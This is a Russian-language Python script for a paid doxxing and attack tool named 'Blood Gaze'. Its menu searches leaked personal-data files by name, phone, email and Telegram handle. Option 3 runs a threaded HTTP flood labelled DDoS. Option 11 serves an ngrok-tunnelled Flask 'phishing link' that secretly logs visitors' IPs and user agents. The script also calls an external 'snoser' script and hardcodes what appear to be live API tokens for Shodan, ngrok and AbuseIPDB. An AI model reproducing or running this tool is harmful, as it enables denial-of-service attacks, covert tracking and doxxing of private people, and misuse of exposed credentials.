﻿import sys
import subprocess
from flask import Flask

required_modules = [
    "colorama", "termcolor", "phonenumbers", "requests", "faker", "urllib.request", "json", "soket", "flask", "pyngrok", "whois"
]

for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        print(f"Устанавливаю {module}...")
        subprocess.run([sys.executable, "-m", "pip", "install", module], check=True)

# Теперь можно импортировать модули
from colorama import init
from termcolor import colored
import phonenumbers
import time
import os
import shodan
import flask
import datetime
import socket
import threading
from flask import Flask, request, redirect
from pyngrok import ngrok
import requests
import random
import whois
from faker import Faker
from phonenumbers import timezone, carrier, geocoder

print("Все модули установлены и импортированы успешно!")

request_num = 0
fake = Faker()
init()
banner = '''
    ██████╗░  ██╗░░░░░  ░█████╗░  ░█████╗░  ██████╗░        ░██████╗░  ░█████╗░  ███████╗  ███████╗
    ██╔══██╗  ██║░░░░░  ██╔══██╗  ██╔══██╗  ██╔══██╗        ██╔════╝░  ██╔══██╗  ╚════██║  ██╔════╝
    ██████╦╝  ██║░░░░░  ██║░░██║  ██║░░██║  ██║░░██║        ██║░░██╗░  ███████║  ░░███╔═╝  █████╗░░
    ██╔══██╗  ██║░░░░░  ██║░░██║  ██║░░██║  ██║░░██║        ██║░░╚██╗  ██╔══██║  ██╔══╝░░  ██╔══╝░░
    ██████╦╝  ███████╗  ╚█████╔╝  ╚█████╔╝  ██████╔╝        ╚██████╔╝  ██║░░██║  ███████╗  ███████╗
    ╚═════╝░  ╚══════╝  ░╚════╝░  ░╚════╝░  ╚═════╝░        ░╚═════╝░  ╚═╝░░╚═╝  ╚══════╝  ╚══════╝

                                         Version - 1.0 Apha
                                         Creater - @AnonimArka
                                         Price - 100₴
                                         level - Base
   ┌──────────────────────────────────┐  ┌──────────────────────────────────┐  ┌──────────────────────────────────┐  
   │    1 |  Поиск по номеру(не бд)   │  │     2 |  Поиск по ФИО            │  │       3 | ДДОС                   │
   └──────────────────────────────────┘  └──────────────────────────────────┘  └──────────────────────────────────┘    
   ┌──────────────────────────────────┐  ┌──────────────────────────────────┐  ┌──────────────────────────────────┐  
   │    4 |  Поиск по номеру(по бд)   │  │     5 |  Поиск по ТГ             │  │       6 | Генератор ЕМАИЛОВ      │
   └──────────────────────────────────┘  └──────────────────────────────────┘  └──────────────────────────────────┘
   ┌──────────────────────────────────┐  ┌──────────────────────────────────┐  ┌──────────────────────────────────┐  
   │    7 |  Поиск по имейлу          │  │     8 |  Поиск по Нику           │  │       9 | Тотальный поиск        │
   └──────────────────────────────────┘  └──────────────────────────────────┘  └──────────────────────────────────┘   
               ┌──────────────────────────────────┐                   ┌──────────────────────────────────┐          
               │    10 |  Поиск по IP             │                   │    11 |  Фишинговая ссылка IP    │                                  
               └──────────────────────────────────┘                   └──────────────────────────────────┘
                                             ┌───────────────────────────┐
                                             │    12 |   Сносер          │
                                             └───────────────────────────┘
                                             ┌───────────────────────────┐
                                             │    13 |   ВЫХОД           │
                                             └───────────────────────────┘

'''

# Выводим баннер с алым цветом
print(colored(banner, "red"))


def search_in_files(search_term):
    count = 0
    found = False

    for i in range(100):
        filename = f"datab{i}.txt"
        if os.path.isfile(filename):
            count += 1

    print(f"{count} Databases found")

    # Поиск по содержимому файлов
    for i in range(count):
        filename = f"datab{i}.txt"
        try:
            with open(filename, 'r', encoding='utf-8') as file:
                for line_number, line in enumerate(file, start=1):
                    if search_term in line:
                        print(f"Найдено в строке {line_number}: {line.strip()}")
        except FileNotFoundError:
            print(f"Ошибка: файл '{filename}' не найден.")
        except Exception as e:
            print(f"Ошибка: {e} в файле datab{i}.txt")

    if not found:
        print("Data not found in any database.")

API_KEY_SHODAN = "qvlTYbZKbb4Ln0YO7EWp61Qt3TH1oO8Z"
shodan_api = shodan.Shodan(API_KEY_SHODAN)
def ip_search():
    import urllib.request
    import json
    getIP = input('Введите IP -> ')
    url = f"https://ipinfo.io/{getIP}/json"

    try:
        getInfo = urllib.request.urlopen(url)
        infoList = json.load(getInfo)
    except:
        print('IP не найдено!')
        time.sleep(2)
        return

    def whoisIPinfo(ip):
        try:
            myCommand = rf"D:\\Dll\\bin\\whois.exe {ip}"
            whoisInfo = os.popen(myCommand).read()
            return whoisInfo
        except Exception as e:
            return f'Ошибка! {e}'

    print("┌IP:", infoList.get("ip", "Не найдено"))
    print("│Город:", infoList.get("city", "Не указан"))
    print("│Регион:", infoList.get("region", "Не указан"))
    print("│Страна:", infoList.get("country", "Не указана"))
    print("│Временная зона:", infoList.get("timezone", "Не указана"))
    print("│Координаты:", infoList.get("loc", "Не указаны"))
    print("│Название хоста:", infoList.get("hostname", "Не указано"))
    print("└Индекс:", infoList.get("postal", "Не указан"))
    print("│")
    # Додаткові географічні дані
    try:
        geo_url = f"https://geocode.xyz/{getIP}?json=1&auth=463988956588585917238x34717"
        geo_response = urllib.request.urlopen(geo_url)
        geo_data = json.load(geo_response)
        print("┌Широта:", geo_data.get("lat", "Не найдена"))
        print("│Довгота:", geo_data.get("lon", "Не знайдена"))
        print("└Місце розташування:", geo_data.get("city", "Не вказано"))
    except:
        print("Ошибка при получении географической информации.")

    try:
        query = f'ip:{getIP}'  # Ищем информацию о конкретном IP
        shodan_results = shodan_api.search(query)

        print("┌Shodan IP информация:")
        for result in shodan_results['matches']:
            print(f"│IP: {result['ip_str']}")
            print(f"│Организация: {result.get('org', 'Неизвестно')}")
            print(f"│Открытый порт: {result.get('port', 'Неизвестно')}")
            print(f"│Сервис: {result.get('product', 'Неизвестно')}")
            print("│---")
        print("└Всего найдено совпадений:", shodan_results.get('total', 'Неизвестно'))
    except shodan.APIError as e:
        print(f"Ошибка Shodan API: {e}")

    print("│")
    print("┌Организация/ASN:", infoList.get("org", "Не указана"))
    print("│IP-тип:", infoList.get("ip", "Не указан").split(":")[0])
    print("└Дата последнего обновления:", infoList.get("time", "Не указана"))
    print("│")

    print("┌VPN:", infoList.get("privacy", {}).get("vpn", "Нет данных"))
    print("│Proxy:", infoList.get("privacy", {}).get("proxy", "Нет данных"))
    print("└TOR:", infoList.get("privacy", {}).get("tor", "Нет данных"))
    print("│")

    abuse_info = infoList.get("abuse", {})
    print("┌Контакты для жалоб:")
    print("│Email:", abuse_info.get("email", "Нет данных"))
    print("│Имя:", abuse_info.get("name", "Нет данных"))
    print("└Телефон:", abuse_info.get("phone", "Нет данных"))
    print("│")

    # Дополнительные сведения об IP
    try:
        additional_info = urllib.request.urlopen(f"https://ipinfo.io/{getIP}/json").read()
        additional_data = json.loads(additional_info)
        print("┌AS Number:", additional_data.get("asn", {}).get("asn", "Не найдено"))
        print("│Организация:", additional_data.get("company", {}).get("name", "Не найдена"))
        print("└Список связанных доменов:", additional_data.get("domains", {}).get("total", "Не найдено"))
    except:
        print("Ошибка при получении дополнительных данных.")
    print("│")

    # Проверка на облачные сервисы и дата-центры
    try:
        cloud_info = urllib.request.urlopen(f"https://ipinfo.io/{getIP}/json").read()
        cloud_data = json.loads(cloud_info)
        print("┌Дата-центр:", cloud_data.get("hosting", "Нет данных"))
        print("└Провайдер облачных сервисов:", cloud_data.get("company", {}).get("name", "Не найдено"))
    except:
        print("Ошибка при проверке облачных сервисов.")
    print("│")

    # Проверка IP на AbuseIPDB
    try:
        abuse_url = f"https://api.abuseipdb.com/api/v2/check?ipAddress={getIP}&maxAgeInDays=90"
        headers = {"Key": "b0fd8ab8291c392df4420c47edfd04ca14c7533410f27b2be50516933eee934e59ca1d4d083dab4c", "Accept": "application/json"}
        req = urllib.request.Request(abuse_url, headers=headers)
        with urllib.request.urlopen(req) as response:
            abuse_data = json.load(response)
            print("┌Репутация IP:", abuse_data.get("data", {}).get("abuseConfidenceScore", "Нет данных"))
            print("└Последнее сообщение о злоупотреблении:",
                  abuse_data.get("data", {}).get("lastReportedAt", "Нет данных"))
    except:
        print("Ошибка при получении данных AbuseIPDB.")
    print("│")

    if input("Do you need who is info (y/n)") == 'y':
        whois_info = whoisIPinfo(getIP)
        print("WHOIS информация:\n", whois_info)

    time.sleep(3)


ngrok.set_auth_token("2uOsAdlQ6b03zXhiGUMKodfnBDu_4qHcmGMKCfVd1yq9c65D4")

def start_ip_logger(redirect_url="https://google.com", port=5000):
    app = Flask(__name__)
    LOG_FILE = "ip_logs.txt"

    def log_ip(ip, user_agent, country):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] IP: {ip} | Страна: {country} | User-Agent: {user_agent}\n"
        with open(LOG_FILE, "a") as file:
            file.write(log_entry)
        print(log_entry.strip())

    def get_country(ip):
        try:
            response = requests.get(f"https://ipinfo.io/{ip}/json").json()
            return response.get("country", "Неизвестно")
        except Exception as e:
            print(f"Ошибка получения страны для IP {ip}: {e}")
            return "Ошибка API"

    @app.route("/")
    def track_ip():
        try:
            # Получаем реальный IP через X-Forwarded-For, если доступен
            user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
            user_agent = request.headers.get("User-Agent", "Unknown")
            country = get_country(user_ip)
            log_ip(user_ip, user_agent, country)
            return redirect(redirect_url)
        except Exception as e:
            print(f"Ошибка в track_ip: {e}")
            return "Ошибка обработки запроса", 500

    # Запуск Ngrok
    try:
        public_url = ngrok.connect(port).public_url
        print(f"🔗 Ссылка для отслеживания IP: {public_url}")

        # Запуск Flask в фоне
        app.run(host="0.0.0.0", port=port)
    except Exception as e:
        print(f"Ошибка запуска Ngrok или Flask: {e}")



while True:
    try:
        inp = input(colored("[?]Введи:", "blue"))

        if inp == "1":
            def check_leaks(phone):
                try:
                    response = requests.get(f"https://api.leaks.com/check?phone={phone}")
                    if response.status_code == 200:
                        data = response.json()
                        if data.get("found"):
                            return f"⚠️ Найден в утечках: {data['details']}"
                        else:
                            return "✅ Номер не найден в утечках"
                except:
                    return "❌ Ошибка проверки утечек"


            # Функция проверки номера в мессенджерах
            def check_messengers(phone):
                messengers = {
                    "Telegram": f"https://t.me/{phone}",
                    "WhatsApp": f"https://wa.me/{phone}",
                    "Viber": f"https://viber.click/{phone}",
                    "VK": f"https://vk.me/{phone}"
                }
                return messengers


            # Функция поиска по соцсетям
            def check_socials(phone):
                socials = {
                    "VK": f"https://vk.com/phone{phone}",
                    "Facebook": f"https://www.facebook.com/search/top?q={phone}",
                    "Instagram": f"https://www.instagram.com/{phone}",
                    "Twitter": f"https://twitter.com/search?q={phone}",
                    "Truecaller": f"https://www.truecaller.com/search/global/{phone}"
                }
                return socials


            # Функция для геолокации (широта и долгота)
            def get_phone_geo_location(phone):
                geo_url = f"https://ipinfo.io/{phone}/json"
                try:
                    geo_response = requests.get(geo_url)
                    geo_data = geo_response.json()
                    return geo_data.get("city", "Не указан"), geo_data.get("region", "Не указан"), geo_data.get(
                        "country", "Не указана")
                except requests.exceptions.RequestException:
                    return "Не удалось получить данные", "Не удалось получить данные", "Не удалось получить данные"


            # Функция для проверки репутации номера через Truecaller
            def check_spam_reputation(phone):
                try:
                    # Пример использования Truecaller (это только на примере, настоящий запрос нужно адаптировать по API)
                    truecaller_url = f"https://www.truecaller.com/search/{phone}"
                    response = requests.get(truecaller_url)
                    if "Not found" in response.text:
                        return "✅ Нет репутации спама."
                    else:
                        return "⚠️ Может быть спам номер."
                except requests.exceptions.RequestException:
                    return "❌ Ошибка при проверке репутации."


            # Функция для WHOIS информации по домену или IP
            def get_whois_info(domain_or_ip):
                try:
                    myCommand = rf"D:\\Dll\\bin\\whois.exe {domain_or_ip}"
                    whoisInfo = os.popen(myCommand).read()

                    # Проверка на пустой или невалидный результат
                    if "No whois server is known for this kind of object" in whoisInfo:
                        return "❌ Нет данных WHOIS для этого объекта"

                    return whoisInfo
                except Exception as e:
                    return f"❌ Ошибка WHOIS: {e}"


            # Ввод номера
            format_number = input(colored("📲 Введи код страны (+7, +380 и т. д.): ", "blue"))
            number = input(colored("☎ Введи номер: ", "blue"))

            full = f"{format_number}{number}"
            number_parse = phonenumbers.parse(full)

            # Основная информация
            Carrier = carrier.name_for_number(number_parse, "ru")
            Region = geocoder.description_for_number(number_parse, "ru")
            Zones = timezone.time_zones_for_number(number_parse)

            is_valid = phonenumbers.is_valid_number(number_parse)
            is_possible = phonenumbers.is_possible_number(number_parse)

            country_code = number_parse.country_code
            international_format = phonenumbers.format_number(number_parse,
                                                              phonenumbers.PhoneNumberFormat.INTERNATIONAL)
            national_format = phonenumbers.format_number(number_parse, phonenumbers.PhoneNumberFormat.NATIONAL)

            # Определение типа номера
            number_type = phonenumbers.number_type(number_parse)
            type_dict = {
                phonenumbers.PhoneNumberType.MOBILE: "Мобильный",
                phonenumbers.PhoneNumberType.FIXED_LINE: "Стационарный",
                phonenumbers.PhoneNumberType.VOIP: "VoIP (интернет-звонки)",
                phonenumbers.PhoneNumberType.UNKNOWN: "Неизвестный"
            }
            number_type_str = type_dict.get(number_type, "Неизвестный")

            # Ссылки на мессенджеры
            messengers = check_messengers(full)

            # Проверка в утечках
            leak_status = check_leaks(full)

            # Проверка в соцсетях
            socials = check_socials(full)

            # Получение местоположения
            city, region, country = get_phone_geo_location(full)

            # Проверка на спам
            spam_status = check_spam_reputation(full)

            # WHOIS информация
            whois_info = get_whois_info(full)

            # Вывод информации
            print(colored("\n--- ℹ Информация о номере ---\n", "green"))
            print(f"📞 Полный номер: {full}")
            print(f"🌍 Код страны: {country_code}")
            print(f"📍 Регион: {Region}")
            print(f"⏳ Часовой пояс: {', '.join(Zones) if Zones else 'Не найден'}")
            print(f"📡 Оператор связи: {Carrier if Carrier else 'Неизвестен'}")
            print(f"📌 Тип номера: {number_type_str}")
            print(f"✔️ Валидный: {'Да' if is_valid else 'Нет'}")
            print(f"⚠️ Возможный: {'Да' if is_possible else 'Нет'}")
            print(f"📜 Международный формат: {international_format}")
            print(f"📜 Национальный формат: {national_format}")
            print(f"🌍 Местоположение: {city}, {region}, {country}\n")

            print(colored("--- 📲 Мессенджеры ---\n", "yellow"))
            for app, link in messengers.items():
                print(f"🔹 {app}: {link}")

            print(colored("\n--- 🔍 Проверка в утечках ---\n", "red"))
            print(leak_status)

            print(colored("\n--- 🔗 Поиск в соцсетях ---\n", "cyan"))
            for network, link in socials.items():
                print(f"🔹 {network}: {link}")

            # Поиск в Google, Yandex
            google_search = f"https://www.google.com/search?q={full}"
            yandex_search = f"https://yandex.ru/search/?text={full}"

            print(colored("\n--- 🌐 Поиск информации ---\n", "magenta"))
            print(f"🔎 Google: {google_search}")
            print(f"🔎 Yandex: {yandex_search}")

            # Проверка репутации через Truecaller
            print(colored("\n--- 🚨 Проверка репутации ---\n", "red"))
            print(spam_status)

            # WHOIS информация
            print(colored("\n--- 🧑‍💻 WHOIS информация ---\n", "yellow"))
            print(whois_info)

        if inp == "2":
            data = input("Enter Name or Second name or third name(you shouldn't write it together): ")
            search_in_files(data)

        if inp == "3":
            def ddd():
                url = input(f'Введите ссылку (начиная с http:) -> ')
                num_requests = int(input(f'Введите количество запросов на сайт -> '))

                user_agents = [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
                    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
                    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'
                ]

                def send_request(i):
                    user_agent = random.choice(user_agents)
                    headers = {'User-Agent': user_agent}

                    try:
                        response = requests.get(url, headers=headers, timeout=0.1)
                        print(f"Request {i} sent successfully\n")
                    except:
                        print(f"Request {i} sent successfully\n")

                threads = []
                for i in range(1, num_requests + 1):
                    t = threading.Thread(target=send_request, args=[i])
                    t.start()
                    threads.append(t)

                for t in threads:
                    t.join()
                ddd()
            ddd()

        if inp == "4":
            data = input("Enter Number without region(+7 or another): ")
            search_in_files(data)

        if inp == "5":
            data = input("Enter Telegramm nickname (try username without @ too) or Api Id: ")
            search_in_files(data)

        if inp == "6":
            types = ["@gmail.com", "@yachoo.com", "@mail.ru", "@yandex.com"]

            strings = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u",
                       "z",
                       "v"]
            integers = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]

            email = random.choice(strings) + random.choice(strings) + random.choice(integers) + random.choice(
                integers) + random.choice(strings) + random.choice(integers) + random.choice(strings) + random.choice(
                strings) + random.choice(types)
            print(colored(f"Ваш случайный емаил: {email}", "blue"))

        if inp == "7":
            data = input("Enter mail adress(gmail, email...): ")
            search_in_files(data)

        if inp == "8":
            data = input("Enter NikName: ")
            working_directory = r"D:\PycharmProjects\snoop\.venv\snoop"
            subprocess.run([sys.executable, "snoop.py", data], check=True, cwd=working_directory)

        if inp == "9":
            data = input("Enter something: ")
            search_in_files(data)

        if inp == "10":
            ip_search()

        if inp == "11":
            start_ip_logger()

        if inp == "12":
            working_directory = r"D:\\PycharmProjects\\BloodGaze\\.venv\\Goose"
            subprocess.run([sys.executable, "gooseprem.py"], check=True, cwd=working_directory)

        if inp == "13":
            break;
    except:
        continue